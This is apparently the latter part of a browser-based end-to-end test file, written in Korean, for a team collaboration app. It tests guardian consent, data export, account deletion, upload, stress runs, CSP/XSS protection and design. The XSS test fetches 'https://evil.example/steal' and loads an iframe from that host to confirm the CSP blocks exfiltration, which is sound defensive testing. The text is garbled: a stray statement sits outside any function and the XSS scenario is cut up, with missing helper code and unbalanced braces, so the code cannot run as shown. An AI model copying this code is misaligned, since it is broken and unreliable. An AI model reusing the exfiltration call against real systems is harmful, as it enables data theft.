  ok(req.guardianUid === 'uP' && req.guardianEmail === 'p@x.com' && req.decidedAt > 0, '보호자 동의 기록');
  closeFrame('uP');
  const K2 = await open('uC', { consent: false });
  await until(() => K2.eval('cloud.consentChecked && consentOk()'));
  ok(K2.eval('consentOk()') && !K2.document.getElementById('guardianLink'), '보호자 승인 후 시작 가능');
  const T = await makeRoom(K2, '아이의 방');
  ok(Boolean(await getDoc(`teams/${T}`)), '승인 후 방 만들기 성공');
  // 철회
  const G2 = await open('uP', { consent: false, query: `&guardian=${token}` });
  await until(() => G2.document.querySelector('[data-guardian="revoked"]'));
  G2.document.querySelector('[data-guardian="revoked"]').click();
  await until(async () => (await getDoc(`guardianRequests/${token}`))?.status === 'revoked');
  ok(true, '보호자가 동의 철회');
  closeFrame('uP'); closeFrame('uC');
  const K3 = await open('uC', { consent: false });
  await until(() => K3.document.getElementById('guardianLink'));
  ok(Boolean(K3.document.getElementById('guardianLink')) && K3.document.body.textContent.includes('동의하지 않았어요'), '철회하면 앱이 막힘');
  // 동의 판이 바뀌면 다시 묻는다
  closeFrame('uC');
  await setDoc('users/uX', { consent: { version: 'old', at: 1, over14: true, terms: true, privacy: true } });
  const A2 = await open('uX', { consent: false });
  await until(() => A2.document.getElementById('consentForm'));
  ok(A2.document.getElementById('consentForm')?.textContent.includes('약관이 바뀌었어요'), '약관이 바뀌면 다시 동의를 받음');
  closeAll();
}

// ---------- 내 데이터 내려받기와 계정 삭제 ----------
async function scenarioDelete() {
  say('\n=== 내 데이터 내려받기·계정 삭제');
  closeAll();
  await wipe();
  const A = await open('uA'), B = await open('uB');
  const T = await makeRoom(A, '함께 쓰는 방');
  await joinAs(B, await invite(A, 'student'), '김단유');
  const mA = A.eval('state.meId');
  A.eval(`addItem({ memberId: state.meId, type: 'memo', title: '지울 메모', content: '내 내용', visibility: 'me' })`);
  B.eval(`addItem({ memberId: state.meId, type: 'memo', title: '남을 메모', content: 'B 내용', visibility: 'team' })`);
  await until(async () => (await list(`teams/${T}/items`)).length === 2);
  await setDoc(`teams/${T}/calls/c1`, { id: 'c1', title: '회의', status: 'ended', startedBy: 'uB', startedAt: 1, endedAt: 2, summary: '요약' });
  await setDoc(`teams/${T}/calls/c1/lines/a`, { uid: 'uA', memberId: mA, name: '안치성', text: 'A가 한 말', at: 1 });
  await setDoc(`teams/${T}/calls/c1/lines/b`, { uid: 'uB', memberId: 'x', name: '김단유', text: 'B가 한 말', at: 2 });
  await setDoc(`teams/${T}/calls/c1/peers/uA`, { uid: 'uA', name: '안치성', joinedAt: 1, beat: 1 });
  await until(() => A.eval(`state.calls.length === 1`));
  // 내려받기
  A.eval(`download = (name, text) => { window.__dl = text; }`);
  A.document.getElementById('menuBtn').click();
  await until(() => A.document.getElementById('downloadMyData'));
  A.document.getElementById('downloadMyData').click();
  await until(() => A.__dl, 8000);
  const dl = JSON.parse(A.__dl || '{}');
  ok(dl.account?.email === 'a@x.com' && dl.consent?.over14 === true, '내려받기: 계정과 동의 기록');
  const room = dl.rooms?.[0];
  ok(room?.records.some(r => r.title === '지울 메모') && !room.records.some(r => r.title === '남을 메모'), '내려받기: 내 기록만');
  ok(room?.lines.some(l => l.text === 'A가 한 말') && !room.lines.some(l => l.text === 'B가 한 말'), '내려받기: 내가 한 말만');
  A.eval('closeModal()');
  // 혼자인 방도 하나 더
  await A.eval('cloudClose(); state = null; 1');
  const solo = await makeRoom(A, '혼자 방');
  await A.eval(`cloudOpenTeam('${T}')`);
  await until(() => A.eval('cloud.loaded && state.meId'));
  // 잘못 입력하면 지우지 않는다
  A.__promptAnswer = '아니요';
  A.document.getElementById('menuBtn').click();
  await until(() => A.document.getElementById('deleteAccountBtn'));
  A.document.getElementById('deleteAccountBtn').click();
  await sleep(400);
  ok(Boolean(await getDoc('users/uA')) && !A.__authDeleted, '확인 문구가 틀리면 지우지 않음');
  A.__promptAnswer = '삭제';
  A.document.getElementById('deleteAccountBtn').click();
  await until(() => A.__authDeleted, 20000);
  ok(A.__authDeleted === true, '로그인 계정 삭제');
  ok(!(await getDoc('users/uA')), '계정 문서 삭제');
  const items = await list(`teams/${T}/items`);
  ok(!items.some(i => i.ownerUid === 'uA') && items.some(i => i.title === '남을 메모'), '내 기록만 삭제, 다른 사람 기록은 남음');
  ok(!(await list(`teams/${T}/itemMeta`)).some(i => i.ownerUid === 'uA'), '횟수 기록 삭제');
  const lines = await list(`teams/${T}/calls/c1/lines`);
  ok(!lines.some(l => l.uid === 'uA') && lines.some(l => l.uid === 'uB'), '내가 한 말만 삭제');
  ok(!(await getDoc(`teams/${T}/presence/uA`)) && !(await getDoc(`teams/${T}/members/uA`)) && !(await getDoc(`teams/${T}/claims/${mA}`)), '접속 표시·역할·칸 연결 삭제');
  const entry = await getDoc(`teams/${T}/roster/${mA}`);
  ok(entry?.name === '탈퇴한 팀원' && !entry.uid, '명단의 내 이름을 지움');
  ok((await getDoc(`teams/${T}`))?.ownerUid === 'uB', '내 방은 다른 팀원에게 넘어감');
  ok(!(await getDoc(`teams/${solo}`)), '혼자인 방은 삭제');
  ok(!Object.keys(A.localStorage).some(k => k.startsWith('brainroom:')), '이 브라우저의 BrainRoom 데이터 삭제');
  await until(() => B.eval('cloud.owner'), 8000);
  ok(B.eval('cloud.owner'), '넘겨받은 팀원에게 방 관리 권한');
  A.__errors.length = 0;
  noDenied(B, 'B');
  closeAll();
}

// 기존 기록을 온라인 방으로 올리기 (샘플 전체): 앱이 보내는 모든 문서가 규칙을 통과해야 한다
async function scenarioUpload() {
  say('\n=== 기존 기록을 온라인 방으로 올리기');
  closeAll();
  await wipe();
  const A = await open('uA');
  A.eval(`saveSuppressed = true; window.__ws = sampleWorkspace(); saveSuppressed = false; window.__wsCounts = { items: __ws.items.length, decisions: __ws.decisions.length, quests: __ws.quests.length, members: __ws.members.length }`);
  const want = JSON.parse(A.eval('JSON.stringify(__wsCounts)'));
  A.eval('state = null');
  await A.eval('cloudCreateTeamFrom(__ws)');
  await until(() => A.eval('cloud.loaded && state && state.items.length'));
  const T = A.eval('cloud.teamId');
  ok((await list(`teams/${T}/items`)).length === want.items && (await list(`teams/${T}/itemMeta`)).length === want.items, `기록 ${want.items}개와 횟수 기록을 모두 올림`);
  ok((await list(`teams/${T}/roster`)).length === want.members, `명단 ${want.members}칸`);
  ok((await list(`teams/${T}/decisions`)).length === want.decisions && (await list(`teams/${T}/quests`)).length === want.quests, '결정·퀘스트');
  noDenied(A, 'A');
  // 주인 없는 칸 정리
  await A.eval(`teamRef().collection('roster').doc('slot1').set({ id: 'slot1', name: '장난', color: '#123456', at: 9 })`);
  await until(() => A.eval(`Boolean(member('slot1'))`));
  await A.eval('openManageModal()');
  await until(() => A.document.querySelector('[data-cloud="slot:slot1"]'));
  A.document.querySelector('[data-cloud="slot:slot1"]').click();
  await until(() => A.eval(`!member('slot1')`));
  ok(A.eval(`!member('slot1')`), '팀장이 주인 없는 명단 칸을 지움');
  A.eval('closeModal()');
  noDenied(A, 'A');
}

  B.eval(`loadMyTeams().then(() => cloudOpenTeam('${T}'))`);

// 간헐 오류 재현용: 접근 기록 + 방 삭제를 반복한다 (npm run e2e -- stress 처럼 따로 돌린다)
async function scenarioStress(rounds = 12) {
  say('=== 반복 시험: 접근 기록·방 삭제');
  closeAll();
  await wipe();
  const A = await open('uA'), X = await open('uX');
  for (let i = 0; i < rounds; i++) {
    const T = await makeRoom(A, `반복 ${i}`);
    await X.eval(`cloudJoin('${T}', 'wrong-code', 'student')`);
    const logged = await until(async () => (await list(`teams/${T}/accessLogs`)).some(l => l.uid === 'uX' && l.email === 'x@x.com'), 8000);
    ok(logged, `#${i} 막힌 접근 기록${logged ? '' : ` → warns: ${X.__warns.join(' | ')} errors: ${X.__errors.join(' | ')}`}`);

    A.eval(`addItem({ memberId: state.meId, type: 'memo', title: '기록 ${i}', content: '내용', visibility: 'team' })`);
    if (i % 2) await until(async () => (await list(`teams/${T}/items`)).length === 1); // 절반은 저장이 끝나기 전에 바로 지운다
    await A.eval('cloudDeleteTeam()');
    const gone = await until(async () => !(await getDoc(`teams/${T}`)), 8000);
    const bad = A.__errors.filter(e => /permission/i.test(e));
    ok(gone && !bad.length, `#${i} 방 삭제${bad.length ? ` → ${bad.join(' | ')}` : ''}${gone ? '' : ' (안 지워짐)'}`);
    A.__errors.length = 0;
    await sleep(100);
  }
}

async function scenarioXss() {

  closeAll();

    const ran = w.__xss || 0;
    const errs = w.__errors.filter(e => /exception|rejection/.test(e));
    w.__errors.length = 0;
    const safe = !nodes.length && !ran && !errs.length;
    ok(safe, `${where}${safe ? '' : ` → 주입된 요소 ${nodes.length}개, 실행 ${ran}회, 앱 오류 ${errs.length}건 ${errs[0] ? errs[0].slice(0, 120) : ''} ${nodes[0] ? nodes[0].outerHTML.slice(0, 80) : ''}`}`);
  };
  const step = async (where, fn) => {
    try { await fn(); } catch (e) { (where.startsWith('교수자') || where === '파일' ? P : A).__errors.push(`exception: ${e.message}`); }

  holder.remove();
  ok(!A.__xss, `CSP: 인라인 스크립트·이벤트·javascript: 링크가 실행되지 않음 (막은 시도 ${A.__csp.length}건)`);
  ok(A.__csp.some(v => v.includes('evil.example')), 'CSP: 외부 스크립트 차단');
  let sent = true;
  try { await A.fetch('https://evil.example/steal?x=1', { mode: 'no-cors' }); } catch (e) { sent = false; }
  ok(!sent, 'CSP: 데이터를 낯선 서버로 보내지 못함');
  const frameTest = A.document.createElement('iframe');
  frameTest.src = 'https://evil.example/';
  A.document.body.appendChild(frameTest);
  await sleep(300);
  ok(A.__csp.some(v => v.startsWith('frame-src')), 'CSP: 낯선 iframe 차단');
  frameTest.remove();
}

// 디자인 토대: 콘스텔레이션 다크 테마 토큰이 전역에 깔렸는지 + 공통 셸 접근성
async function scenarioDesign() {
  say('\n=== 디자인 토대: 콘스텔레이션');
  closeAll();
  const A = await open('uA');
  const bg = await A.eval('getComputedStyle(document.body).backgroundColor');
  ok(bg === 'rgb(14, 16, 48)', `페이지 배경이 딥네이비여야 함 (--bg #0e1030) → ${bg}`);
  const font = await A.eval('getComputedStyle(document.body).fontFamily.toLowerCase()');
  ok(font.includes('pretendard'), `본문 글꼴 Pretendard 우선 → ${font.slice(0, 60)}`);
  await axeCheck(A, '시작 셸(콘스텔레이션)');
  closeFrame('uA');
}

// 시작/로그인 화면: 콘스텔레이션 히어로 + COLLECT/CONNECT/CREATE
async function scenarioLanding() {
  say('\n=== 시작화면: 콘스텔레이션 히어로');
  closeAll();
  const A = await open('uA');
  await A.eval('renderLogin()');
  const txt = await A.eval('document.getElementById("app").textContent');
  ok(txt.includes('흩어진 생각이') && txt.includes('하나의 방향이 되도록'), '히어로 헤드라인');
  const sampleBtn = await A.eval("!!document.getElementById('guestSampleBtn') && /샘플 팀으로 체험하기/.test(document.getElementById('guestSampleBtn').textContent)");
  ok(sampleBtn, '샘플 팀으로 체험하기 버튼 유지');
  const dots = await A.eval('!!document.querySelector(".hero-dots")');
  ok(dots, '점 모티프 컨테이너(.hero-dots)');
  const rm = await A.eval(`[...document.styleSheets].some(s => { try { return [...s.cssRules].some(r => r.type === 4 && /prefers-reduced-motion/.test(r.conditionText || (r.media && r.media.mediaText) || '') && /hero-dot/.test(r.cssText)); } catch (e) { return false; } })`);
  ok(rm, 'prefers-reduced-motion에서 점 애니메이션 정지 규칙');
  await axeCheck(A, '시작화면(히어로)');
  closeFrame('uA');
}

// 코크핏: 데모 샘플 + 작업 기록을 한 피드로, 검색·소스필터·상세 패널
async function scenarioCockpit() {
  say('\n=== 코크핏 피드');
  closeAll();
  const A = await open('uA');
  await A.eval('(async () => { guestMode = true; state = sampleWorkspace(); await loadSampleApi(); renderWorkspace(); })()');
  const n0 = await A.eval('document.querySelectorAll(".feed-card").length');
  ok(n0 >= 1, `피드 카드 렌더 (${n0})`);
  await A.eval('{ const s = document.querySelector(".feed-search input"); s.value = "다회용기"; s.dispatchEvent(new Event("input", { bubbles: true })); }');
  const n1 = await A.eval('document.querySelectorAll(".feed-card").length');
  ok(n1 >= 1 && n1 < n0, `검색어 입력 시 목록 축소 (${n0}→${n1})`);
  await A.eval('{ const s = document.querySelector(".feed-search input"); s.value = ""; s.dispatchEvent(new Event("input", { bubbles: true })); document.querySelector(".feed-filters [data-src=\\"github\\"]").click(); }');
  const gh = await A.eval('[...document.querySelectorAll(".feed-card")].length');
  ok(gh >= 1, `소스 필터칩(github) 동작 (${gh})`);
  await A.eval('document.querySelector(".feed-card").click();');
  ok(await A.eval('document.getElementById("panel").classList.contains("open")'), '카드 클릭 시 상세 패널 열림');
  await A.eval('document.querySelector("#panel [data-close-panel]").click();');
  await axeCheck(A, '코크핏 피드');
  closeFrame('uA');
}

// 코크핏 레일: 마일스톤·산출물(빠른추가·상태토글) + 팀원 기여도
async function scenarioRail() {
  say('\n=== 코크핏 레일: 마일스톤·산출물·기여도');
  closeAll();
  const A = await open('uA');
  await A.eval('(async () => { guestMode = true; state = sampleWorkspace(); await loadSampleApi(); renderWorkspace(); })()');
  ok(await A.eval('document.querySelectorAll(".rail [data-ms]").length >= 1'), '레일에 시드된 마일스톤 표시');
  const d0 = await A.eval('document.querySelectorAll(".rail [data-dl]").length');
  ok(d0 >= 1, `레일에 시드된 산출물 표시 (${d0})`);
  await A.eval('document.querySelector(".rail [data-rail-add=\\"deliverable\\"]").click();');
  const d1 = await A.eval('document.querySelectorAll(".rail [data-dl]").length');
  ok(d1 === d0 + 1, `산출물 추가로 1개 증가 (${d0}→${d1})`);
  const before = await A.eval('document.querySelector(".rail [data-dl-status]").textContent.trim()');
  await A.eval('document.querySelector(".rail [data-dl-status]").click();');
  const after = await A.eval('document.querySelector(".rail [data-dl-status]").textContent.trim()');
  ok(before !== after, `산출물 상태 토글 반영 (${before}→${after})`);
  ok(await A.eval('document.querySelectorAll(".rail .contrib .contrib-row").length >= 1 && /조각/.test(document.querySelector(".rail .contrib").textContent)'), '기여도 패널에 팀원별 수치');
  await axeCheck(A, '코크핏 레일');
  closeFrame('uA');
}

async function run() {
  if (ONLY === 'xss') { await scenarioXss(); closeAll(); return; }
  if (ONLY === 'consent') { await scenarioConsent(); await scenarioDelete(); closeAll(); return; }
  if (ONLY === 'stress') { await scenarioStress(); closeAll(); return; }
  if (ONLY === 'design') { await scenarioDesign(); closeAll(); return; }
  if (ONLY === 'landing') { await scenarioLanding(); closeAll(); return; }
  if (ONLY === 'cockpit') { await scenarioCockpit(); closeAll(); return; }
  if (ONLY === 'rail') { await scenarioRail(); closeAll(); return; }
  if (!ONLY) { await scenarioDesign(); await scenarioLanding(); await scenarioCockpit(); await scenarioRail(); }
  if (!ONLY || ONLY === 'room') {
    const ctx = await scenarioRoom();
    await scenarioCalls(ctx);
    await scenarioManage(ctx);
    await scenarioLegacy();
    await scenarioUpload();
    await scenarioConsent();
    await scenarioDelete();
    await scenarioXss();
  }
  if (!ONLY || ONLY === 'ai') await window.scenarioAi?.();
  closeAll();
}
window.addEventListener('load', () => run()
  .catch(e => ok(false, `시험 중단: ${e.stack || e}`))
  .finally(() => { window.DONE = true; }));
</script>
</body></html>
